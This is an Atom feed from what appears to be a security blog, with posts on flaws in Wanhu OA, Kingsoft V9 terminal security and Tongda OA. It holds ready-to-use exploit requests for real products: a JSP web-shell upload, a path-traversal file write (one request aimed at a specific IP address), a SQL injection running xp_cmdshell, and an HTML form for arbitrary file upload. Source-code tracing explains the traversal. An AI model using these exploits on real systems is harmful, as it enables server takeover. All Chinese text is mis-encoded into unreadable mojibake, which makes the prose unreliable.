<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://1946dream.github.io/</id>
    <title>ChongMeng</title>
    <updated>2021-08-15T04:00:25.248Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://1946dream.github.io/"/>
    <link rel="self" href="https://1946dream.github.io/atom.xml"/>
    <subtitle>11111111111111111111</subtitle>
    <logo>https://1946dream.github.io/images/avatar.png</logo>
    <icon>https://1946dream.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, ChongMeng</rights>
    <entry>
        <title type="html"><![CDATA[ä¸‡æˆ·OA-æ¼æ´åˆ†æ]]></title>
        <id>https://1946dream.github.io/post/wan-hu-oa-lou-dong-fen-xi/</id>
        <link href="https://1946dream.github.io/post/wan-hu-oa-lou-dong-fen-xi/">
        </link>
        <updated>2021-08-14T15:18:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="æ¼æ´">ğŸ˜€æ¼æ´</h1>
<h2 id="getshell-1">ğŸ˜€Getshell-1ï¼š</h2>
<h4 id="expshellè·¯å¾„ä¸ºdefaultrootuploadhtml">EXP:(shellè·¯å¾„ä¸ºï¼š/defaultroot/upload/html/)</h4>
<pre><code>POST /defaultroot/upload/fileUpload.controller HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Content-Length: 227
Content-Type: multipart/form-data; boundary=6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB
Host: 218.56.135.226:7001
Connection: close

--6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.jsp&quot;
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123
--6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB--
</code></pre>
<h2 id="getshell-2">ğŸ˜€Getshell-2ï¼š</h2>
<h4 id="expshellè·¯å¾„ä¸ºhttpipdefaultroot1txt">EXP:(shellè·¯å¾„ä¸ºï¼šhttp://IP/defaultroot/1.txt)</h4>
<pre><code>POST /defaultroot/officeserverservlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OASESSIONID=52142AC4FD797FAF815BCBEA7872A355; LocLan=zh_CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 244

DBSTEP V3.0     170              0                9              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vMS50eHQ=
111111111111111111111111111111111111111111111111
test123
</code></pre>
<h2 id="é«˜æƒé™ç”¨æˆ·sqlæ³¨å…¥-3">ğŸ˜€é«˜æƒé™ç”¨æˆ·sqlæ³¨å…¥-3ï¼š</h2>
<h4 id="exp">EXP:</h4>
<pre><code>POST /defaultroot/Graph!showResult.action HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://ip:port
Connection: close
Referer: http://ip:port/defaultroot/Graph!runSql.action
Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1
Upgrade-Insecure-Requests: 1

database=localDataSource&amp;dataSQL=exec+master..xp_cmdshell+&quot;ipconfig&quot;;
</code></pre>
<h1 id="æ¼æ´åˆ†æ-getshell">ğŸ¤“æ¼æ´åˆ†æ-Getshell</h1>
<p>å…ˆçœ‹EXP,æˆ‘ä»¬æ ¹æ®EXPè¿›è¡Œè·Ÿè¸ªã€‚</p>
<pre><code>POST /defaultroot/officeserverservlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OASESSIONID=52142AC4FD797FAF815BCBEA7872A355; LocLan=zh_CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 244

DBSTEP V3.0     170              0                9              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vMS50eHQ=
111111111111111111111111111111111111111111111111
test123
</code></pre>
<p>å…ˆä»DBSTEP V3.0 è¿™ä¸ªæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥è¦è¿™ä¹ˆä¼ ï¼Œç„¶åçœ‹ POST DATAå¤´éƒ¨å‚æ•°ï¼Œå‘ç°170å‚æ•°æ˜¯ä»£è¡¨äº†ä»æŠ¥æ–‡ä»€ä¹ˆåœ°æ–¹å¼€å§‹è¯»å–ï¼Œå‚æ•° 9 ä»£è¡¨äº†å†™å…¥å†…å®¹çš„å¤§å°ã€‚<br>
ä¸‹é¢æˆ‘ä»¬çœ‹ OPTIONå‚æ•° å¯¹åº”çš„base64è§£å¯†ä¸ºSAVEFILE<br>
æŸ¥çœ‹æºä»£ç æˆ‘ä»¬å‘ç°(æˆªå–æ ¸å¿ƒç‰‡æ®µ)</p>
<pre><code>try{
    if (request.getMethod().equalsIgnoreCase(&quot;POST&quot;)){
      MsgObj.MsgVariant(ReadPackage(request));
      if (MsgObj.GetMsgByName(&quot;DBSTEP&quot;).equalsIgnoreCase(&quot;DBSTEP&quot;)){	//å¦‚æœæ˜¯åˆæ³•çš„ä¿¡æ¯åŒ…
        mOption=MsgObj.GetMsgByName(&quot;OPTION&quot;) ;							//å–å¾—æ“ä½œä¿¡æ¯
        mUserName=MsgObj.GetMsgByName(&quot;USERNAME&quot;) ;						//å–å¾—ç³»ç»Ÿç”¨æˆ·
        System.out.println(mOption);									//æ‰“å°å‡ºè°ƒè¯•ä¿¡æ¯
</code></pre>
<p>é¦–å…ˆä¼šåˆ¤æ–­æˆ‘ä»¬çš„è¯·æ±‚æ–¹å¼æ˜¯å¦ä¸º POST ï¼Œç¬¬ä¸‰è¡Œå¥½åƒæ˜¯ä»requestè·å–å†…å®¹ï¼Œç„¶ååˆ©ç”¨ GetmsgBynameå‡½æ•°è·å– DBSTEPå‚æ•°çš„å€¼ä¸DBSTEPå¯¹æ¯”æŸ¥çœ‹æ˜¯å¦ä¸€è‡´ï¼Œæˆ‘ä»¬æŸ¥çœ‹æˆ‘ä»¬å¾—çŸ¥ REJTVEVQ base64è§£ç åä¸ºDBSTEPï¼Œç„¶åè¿›å…¥æ¡ä»¶å†…ã€‚è·å– OPTIONçš„å€¼ï¼Œbase64è§£ç U0FWRUZJTEU = SAVEFILE ç„¶åèµ‹å€¼ç»™mOptionã€‚å…¨å±€æœç´¢è¿›å…¥ SAVAFILEåˆ†æ”¯å†…ï¼Œä»£ç å¦‚ä¸‹ã€‚</p>
<pre><code> else if(mOption.equalsIgnoreCase(&quot;SAVEFILE&quot;)){					//ä¸‹é¢çš„ä»£ç ä¸ºä¿å­˜æ–‡ä»¶åœ¨æœåŠ¡å™¨çš„æ•°æ®åº“é‡Œ

          mRecordID=MsgObj.GetMsgByName(&quot;RECORDID&quot;);		    //å–å¾—æ–‡æ¡£ç¼–å·
          mFileName=MsgObj.GetMsgByName(&quot;FILENAME&quot;);		    //å–å¾—æ–‡æ¡£åç§°
          mFileType=MsgObj.GetMsgByName(&quot;FILETYPE&quot;);		    //å–å¾—æ–‡æ¡£ç±»å‹
          mFileSize=MsgObj.MsgFileSize();			    //å–å¾—æ–‡æ¡£å¤§å°
          mFileDate=DbaObj.GetDateTime();                           //å–å¾—æ–‡æ¡£æ—¶é—´
          mFileBody=MsgObj.MsgFileBody();			    //å–å¾—æ–‡æ¡£å†…å®¹
          //mFilePath=&quot;&quot;;                                             //å¦‚æœä¿å­˜ä¸ºæ–‡ä»¶ï¼Œåˆ™å¡«å†™æ–‡ä»¶è·¯å¾„
          mUserName=mUserName;                                      //å–å¾—ä¿å­˜ç”¨æˆ·åç§°
          //mMyDefine1=MsgObj.GetMsgByName(&quot;MyDefine1&quot;);            //å–å¾—å®¢æˆ·ç«¯ä¼ é€’å˜é‡å€¼ MyDefine1=&quot;è‡ªå®šä¹‰å˜é‡å€¼1&quot;
		  String isDoc=MsgObj.GetMsgByName(&quot;isDoc&quot;);//æ˜¯å¦ä¿å­˜ä¸ºdocæ–‡æ¡£
		  String moduleType=MsgObj.GetMsgByName(&quot;moduleType&quot;);//æ¨¡å—ç±»å‹
		  String docName=MsgObj.GetMsgByName(&quot;docName&quot;);//æ–‡ä»¶ä¿å­˜å
          mDescript=&quot;é€šç”¨ç‰ˆæœ¬&quot;;                                 	    //ç‰ˆæœ¬è¯´æ˜
	  	  MsgObj.MsgTextClear();				    //æ¸…é™¤æ–‡æœ¬ä¿¡æ¯
		  //--zhuo
</code></pre>
<p>RECORDID=<br>
isDoc=true<br>
moduleType=govdocument<br>
FILETYPE=../../1.txt<br>
111111111111111111111111111111111111111111111111<br>
test123</p>
<pre><code>if(isDoc.equals(&quot;false&quot;)){
			  if (SaveFile()) 					    //ä¿å­˜æ–‡æ¡£å†…å®¹
			  {
				MsgObj.SetMsgByName(&quot;STATUS&quot;, &quot;ä¿å­˜æˆåŠŸ!&quot;);	            //è®¾ç½®çŠ¶æ€ä¿¡æ¯
				MsgObj.MsgError(&quot;&quot;);				    //æ¸…é™¤é”™è¯¯ä¿¡æ¯
			  }
			  else
			  {
				MsgObj.MsgError(&quot;ä¿å­˜å¤±è´¥!&quot;);			            //è®¾ç½®é”™è¯¯ä¿¡æ¯
			  }
		  }
		  else if(isDoc.equals(&quot;true&quot;)){
			 String myPath=mFilePath+&quot;//iWebOfficeSign//Document&quot;;
			 if(moduleType.equals(&quot;information&quot;)){
				myPath=mFilePath+&quot;//upload//information&quot;;
			 }else if(moduleType.equals(&quot;govdocument&quot;)){
				myPath=mFilePath+&quot;//upload//govdocumentmanager&quot;;

              }else if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//ç´«é‡‘ çŸ¿ä¸š  å½’æ¡£ æ—¶ ç”¨ï¼
              myPath=mFilePath+&quot;//upload//dossier&quot;+&quot;//sendType&quot;+moduleType.substring(moduleType.indexOf(&quot;dossier&quot;)+7); 
			 try {       
                    java.io.File myFilePath = new java.io.File(myPath);
                    if (!myFilePath.exists()) {
                        myFilePath.mkdir();
                    }
                } catch (Exception e) {
                    System.out.println(&quot;æ–°å»ºç›®å½•æ“ä½œå‡ºé”™&quot;);
                    e.printStackTrace();
                }
			 }
</code></pre>
<p>å¯¹ isdocå‚æ•°è¿›è¡Œäº†åˆ¤æ–­ï¼Œæˆ‘ä»¬è·Ÿå¦‚æ¡ä»¶ trueã€‚</p>
<pre><code>else if(isDoc.equals(&quot;true&quot;)){
			 String myPath=mFilePath+&quot;//iWebOfficeSign//Document&quot;;
			 if(moduleType.equals(&quot;information&quot;)){
				myPath=mFilePath+&quot;//upload//information&quot;;
			 }else if(moduleType.equals(&quot;govdocument&quot;)){
				myPath=mFilePath+&quot;//upload//govdocumentmanager&quot;;

              }else if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//ç´«é‡‘ çŸ¿ä¸š  å½’æ¡£ æ—¶ ç”¨ï¼
              myPath=mFilePath+&quot;//upload//dossier&quot;+&quot;//sendType&quot;+moduleType.substring(moduleType.indexOf(&quot;dossier&quot;)+7); 
			 try {       
                    java.io.File myFilePath = new java.io.File(myPath);
                    if (!myFilePath.exists()) {
                        myFilePath.mkdir();
                    }
                } catch (Exception e) {
                    System.out.println(&quot;æ–°å»ºç›®å½•æ“ä½œå‡ºé”™&quot;);
                    e.printStackTrace();
                }
			 }
</code></pre>
<p>mFilePath = request.getSession().getServletContext().getRealPath(&quot;&quot;) ;  //å–å¾—æœåŠ¡å™¨è·¯å¾„ ï¼ˆå¯¹äºjavaä¸ç†Ÿæ‚‰å°±çŒœæµ‹è¿™é‡Œæ˜¯è·å–ç½‘ç«™ç»å¯¹è·¯å¾„)<br>
æ¥ä¸‹æ¥å¯¹ moduleType è¿›è¡Œäº†åˆ¤æ–­ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å€¼ä¸º govdocument æ‰€ä»¥<br>
myPath = ç»å¯¹è·¯å¾„+//upload//govdocumentmanager<br>
æŸ¥çœ‹ç¬¬13è¡Œï¼Œåˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™ åˆ›å»ºæ–‡ä»¶å¤¹ã€‚</p>
<pre><code>//
			 System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
			 System.out.println(mFileType);
		   	 System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;); 
			 if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//ç´«é‡‘ çŸ¿ä¸š  å½’æ¡£ æ—¶ ç”¨ï¼
			  MsgObj.MsgFileSave(myPath + &quot;//&quot; + docName +&quot;(å¸¦ç—•)&quot;+ mFileType);
			 }else{
			 MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + mFileType);
			 
			 }
                /*------ç”¨ftpæŠŠä¿å­˜çš„docæ–‡ä»¶ä¸Šä¼ åˆ°æ–‡ä»¶æœåŠ¡å™¨------------*/
 		   if(sysMap != null &amp;&amp; sysMap.get(&quot;é™„ä»¶ä¸Šä¼ &quot;) != null &amp;&amp; sysMap.get(&quot;é™„ä»¶ä¸Šä¼ &quot;).toString().equals(&quot;0&quot;)&amp;&amp;(moduleType.indexOf(&quot;dossier&quot;)&lt;0)){//ç´«é‡‘ çŸ¿ä¸š  å½’æ¡£ æ—¶  ä¸ä¸Šä¼ 
		        java.util.Map ftpMap = (java.util.Map) request.getSession().getAttribute(&quot;ftpMap&quot;);
//System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
//		        System.out.println(ftpMap.get(&quot;server&quot;).toString());
//				System.out.println(ftpMap.get(&quot;user&quot;).toString());
//				System.out.println(ftpMap.get(&quot;oriPass&quot;) + &quot;whir?!&quot;);
//				System.out.println(myPath + &quot;//&quot; + mRecordID + &quot;.doc&quot;);
//				System.out.println(moduleType.equals(&quot;information&quot;)?&quot;information&quot;:&quot;govdocumentmanager&quot;);
//System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
				//com.whir.common.util.FtpClientTest ftpClient = new com.whir.common.util.FtpClientTest(ftpMap.get(&quot;server&quot;).toString(), ftpMap.get(&quot;user&quot;).toString(), ftpMap.get(&quot;oriPass&quot;) + &quot;whir?!&quot;,myPath + &quot;//&quot; + mRecordID + mFileType,mRecordID + mFileType,moduleType.equals(&quot;information&quot;)?&quot;information&quot;:&quot;govdocumentmanager&quot;);
		        //ftpClient.upload();
		    }
/*------------------------------------------------------*/
          	//----------------------------------------
          	/*try{
          		byte[] buff = new byte[256];
          		java.io.File myFile = new java.io.File(&quot;config/ky.prop&quot;);
          		java.io.FileInputStream fis = new java.io.FileInputStream(myFile);
            	fis.read(buff);
            	String str = new String(buff);
            	str = str.trim();
            	String[] tmp = str.split(((char) 10) + &quot;&quot;);
            	String myPath = tmp[4].trim();
            	MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + &quot;.doc&quot;);
          	}catch(Exception e){}*/
          	//----------------------------------------
		  }

          MsgObj.MsgFileClear();                                    //æ¸…é™¤æ–‡æ¡£å†…å®¹
        }
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬è§‚å¯Ÿç¬¬ä¹è¡Œï¼Œ<br>
MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + mFileType);<br>
mypath + &quot;//&quot; +mRecoreID + mFileType æœ€ç»ˆæ‹¼æ¥åä¸º<br>
ç»å¯¹è·¯å¾„+//upload//govdocumentmanager//../../1.txt<br>
æœ€ç»ˆè·¯å¾„ä¸º ç½‘ç«™ç»å¯¹è·¯å¾„/1.txt<br>
MsgFileSaveå‡½æ•°ä¼ å…¥äº†ä¸€ä¸ªè·¯å¾„ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå‡½æ•°ç”±äºä¸åœ¨å½“å‰jspæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨javaåç¼–è¯‘å·¥å…·åç¼–è¯‘iMsgServer2000.classæ–‡ä»¶å¾—åˆ°æºç ã€‚<br>
GetMsgByNameå‡½æ•°æºç </p>
<pre><code>public String GetMsgByName(String FieldName) {
        String mReturn = &quot;&quot;;
        String mFieldName = FieldName.trim().concat(&quot;=&quot;);
        int i = this._$290.indexOf(mFieldName);
        if (i != -1) {
            int j = this._$290.indexOf(&quot;\r\n&quot;, i + 1);
            int i2 = i + mFieldName.length();
            if (j != -1) {
                String mReturn2 = DecodeBase64(this._$290.substring(i2, j));
                String str = mReturn2;
                return mReturn2;
            }
            String str2 = mReturn;
            return mReturn;
        }
        String str3 = mReturn;
        return mReturn;
    }
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬å­—ç¬¦ä¸²éœ€è¦ä¼ å…¥base64ç¼–ç ã€‚<br>
MsgFileSaveå‡½æ•°æºç </p>
<pre><code>    public boolean MsgFileSave(String FileName) {
        int BlockSize = this.BuffSize * 1024;
        long FileSize = this._$289.length();
        try {
            FileOutputStream mFile = new FileOutputStream(FileName);
            FileInputStream mThis = new FileInputStream(this._$289);
            byte[] BlockBuf = new byte[BlockSize];
            while (FileSize &gt; 0) {
                int CurSize = mThis.read(BlockBuf, 0, BlockSize);
                mFile.write(BlockBuf, 0, CurSize);
                FileSize -= (long) CurSize;
            }
            mThis.close();
            mFile.close();
            return true;
        } catch (Exception e) {
            this._$291 = new StringBuffer().append(this._$291).append(e.toString()).toString();
            System.out.println(e.toString());
            return false;
        }
    }
</code></pre>
<p>æˆ‘ä»¬æœ‰æ—¶å€™åœ¨è·Ÿ this._$289æ˜¯ä»€ä¹ˆå‡½æ•°ï¼Œå‡è®¾çŒœæµ‹ BlockBufå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„170ï¼ŒBlockSize å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„9<br>
ç„¶åå†™åˆ° æˆ‘ä»¬ä¼ å…¥çš„ Filename æ–‡ä»¶è·¯å¾„å†…ã€‚é€ æˆæ–‡ä»¶ä¸Šä¼ Getshell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æŸå±±V9+ç»ˆç«¯å®‰å…¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ]]></title>
        <id>https://1946dream.github.io/post/mou-shan-v9zhong-duan-an-quan-xi-tong-chan-pin/</id>
        <link href="https://1946dream.github.io/post/mou-shan-v9zhong-duan-an-quan-xi-tong-chan-pin/">
        </link>
        <updated>2021-08-14T09:46:53.000Z</updated>
        <content type="html"><![CDATA[<h1 id="å†å²æ¼æ´">ğŸ‘Ÿå†å²æ¼æ´</h1>
<blockquote>
<p>https://forum.butian.net/share/76 (ä¸æ˜¯æ­¤æ¼æ´)</p>
</blockquote>
<h1 id="ä¸‹è½½åœ°å€">ğŸŒ‚ä¸‹è½½åœ°å€</h1>
<blockquote>
<p>http://www.ejinshan.net/lywz/zdv9</p>
</blockquote>
<h1 id="æ¼æ´">æ¼æ´</h1>
<p>è·¯å¾„ï¼š\inter\software_relation.php</p>
<pre><code>&lt;?php
set_time_limit(0);
date_default_timezone_set(&quot;Asia/Shanghai&quot;);
require_once &quot;./use_db.php&quot;;
session_start();
//å‚¨å­˜ä¿¡æ¯åˆ°æ•°æ®åº“sc_software_items
$id=$_POST[&quot;id&quot;];						//è½¯ä»¶å
$toolNames=$_POST[&quot;toolName&quot;];			//è½¯ä»¶å
$toolFileName=$_POST[&quot;toolFileName&quot;];	//æ–‡ä»¶åç§°.exe
$toolDescri=$_POST[&quot;toolDescri&quot;];		//æè¿°
$version=$_POST[&quot;version&quot;];				//ç‰ˆæœ¬å·
$size=$_POST['fileSize'];				//å¤§å°
$arr_softwarekey=$_POST['seilist'];		//å…³è”çš„è½¯ä»¶
$type= $_POST['sofe_typeof'];			//è½¯ä»¶çš„ç±»å‹
$param= isset($_POST['param']) ?$_POST['param'] : &quot;&quot;; //å‚æ•°
$update_time=time();

function iconvCharset($fields){
	//$out_string = mb_detect_encoding($fields, array(&quot;GBK&quot;,&quot;ASCII&quot;, &quot;UTF-8&quot;, &quot;GB2312&quot;,  &quot;BIG5&quot;));
	$out_string = &quot;GBK&quot;;
	$out_string .= &quot;//IGNORE&quot;; 
	// return $fields;
	if (PHP_OS == 'Linux') {
		return iconv(&quot;UTF-8&quot;,&quot;GBK//IGNORE&quot;, $fields);
	}else{
		return iconv(&quot;UTF-8&quot;,$out_string,$fields);
	}
}

$gb2312_filename = $toolFileName;  //iconv(&quot;UTF-8&quot;, &quot;GB2312&quot;,$toolFileName);
$file_path = &quot;../softmanagement/files/{$toolFileName}&quot;;
$file_path_ = &quot;../softmanagement/files/{$gb2312_filename}&quot;;
$_SESSION['name']=$toolFileName;
$_SESSION['time']=time();
$_SESSION['version']=$version;
$toolFileName=$version.'.'.$gb2312_filename;
@mkdir(&quot;../softmanagement/download&quot;);
$download_file = &quot;../softmanagement/download/&quot;;
$file_name=$download_file.$toolFileName;
$photo_name=$download_file.iconv(&quot;UTF-8&quot;, &quot;GB2312&quot;,$_FILES['toolImage']['name']);

$sql_type=&quot;select type_name from  type_software where type_id='$type' &quot;;
$type_res=$mysqlDB-&gt;query($sql_type);
foreach ($type_res as $value) {
	$type_name=$value['type_name'];
}
try {	
	$file_name = iconvCharset($file_name);
	$file_path = iconvCharset($file_path);
	if ($id=='' or $id==null or $id==0 or !isset($_POST[&quot;id&quot;])) {
		// $idä¸ºç©ºè¡¨ç¤ºä¸Šä¼ 
		if (copy($file_path,$file_name) || copy($file_path_, $file_name)) {
			//é»˜è®¤å›¾ç‰‡
			$photo_file='default.png';
			if($_FILES['toolImage']['tmp_name'] != ''){
				if (move_uploaded_file($_FILES['toolImage']['tmp_name'],$ )) {
					$photo_file=$_FILES['toolImage']['name'];
				}else{
					echo json_encode(&quot;move photo file failed&quot;);
					exit();
				}	
			}
</code></pre>
<p>è¿™é‡Œé‡ç‚¹å…³æ³¨<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>o</mi><mi>o</mi><mi>l</mi><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">toolFileName=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_POST[&quot;toolFileName&quot;];<br>
$gb2312_filename = $toolFileName;<br>
<img src="https://1946dream.github.io//post-images/1628999067165.png" alt="" loading="lazy"><br>
éœ€è¦æ„é€ ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶æ‰å¯è¿›å…¥ä»£ç å—1.<br>
<img src="https://1946dream.github.io//post-images/1628999184046.png" alt="" loading="lazy"><br>
æœç´¢å‘ç°softmanagementæ–‡ä»¶å¤¹ä¸‹ å­˜åœ¨default.pngæ–‡ä»¶ã€‚<br>
æ„é€ toolFileName =  ./../default.png</p>
<h2 id="å°å‘">ğŸ˜¿å°å‘</h2>
<p>å¦‚æœæˆ‘ä»¬ç›´æ¥æ„é€ ../default.png<br>
<img src="https://1946dream.github.io//post-images/1628999233850.png" alt="" loading="lazy"><br>
è¿™é‡Œä¼šå˜æˆ .../default.png é€ æˆcopyå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸å­˜åœ¨ã€‚</p>
<h1 id="exp">ğŸ’ªEXP</h1>
<pre><code>&lt;form action=&quot;URL/inter/software_relation.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;version&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;toolFileName&quot; value=&quot;./../default.png&quot;&gt;
filename:&lt;input type=&quot;file&quot; name=&quot;toolImage&quot;&gt;
&lt;button&gt;æäº¤&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p><img src="https://1946dream.github.io//post-images/1628999286236.png" alt="" loading="lazy"><br>
<img src="https://1946dream.github.io//post-images/1628999304225.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å­¦ä¹ ä»£ç å®¡è®¡ç³»åˆ—-é€šè¾¾OA]]></title>
        <id>https://1946dream.github.io/post/xue-xi-dai-ma-shen-ji-xi-lie-tong-da-oa/</id>
        <link href="https://1946dream.github.io/post/xue-xi-dai-ma-shen-ji-xi-lie-tong-da-oa/">
        </link>
        <updated>2021-08-14T09:33:44.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>å…ˆæŠŠæ ‡é¢˜åˆ—ä¸Šæ…¢æ…¢è¡¥å……ã€‚</p>
</blockquote>
<h1 id="ç‰ˆæœ¬å·">ğŸ©ç‰ˆæœ¬å·</h1>
<p>OAå†…éƒ¨ç‰ˆæœ¬å·å¯¹åº”è¯´æ˜ï¼š<br>
11.xä¸º11.0ç‰ˆæœ¬ï¼Œ<br>
10.xä¸º2017ç‰ˆï¼Œ9.xä¸º2016ç‰ˆï¼Œ<br>
8.xä¸º2015ç‰ˆï¼Œ<br>
7.xä¸º2013å¢å¼ºç‰ˆï¼Œ<br>
6.xä¸º2013ç‰ˆï¼Œ<br>
5.1ä¸º2011å¢å¼ºç‰ˆï¼Œ<br>
5.0ä¸º2011ç‰ˆï¼Œ<br>
3.6ä¸º2010ç‰ˆï¼Œ<br>
3.5ä¸º2009ç‰ˆï¼Œ<br>
3.4ä¸º2008å¢å¼ºç‰ˆï¼Œ<br>
3.3ä¸º2008ç‰ˆï¼Œ<br>
3.2ä¸º2007ç¬¬äºŒç‰ˆï¼Œ<br>
3.1ä¸º2007ç¬¬ä¸€ç‰ˆã€‚</p>
<h1 id="æºç ä¸‹è½½">ğŸ‘“æºç ä¸‹è½½</h1>
<p>https://cdndown.tongda2000.com/oa/2019/TDOA11.1.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.5.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.8.exe<br>
https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe</p>
]]></content>
    </entry>
</feed>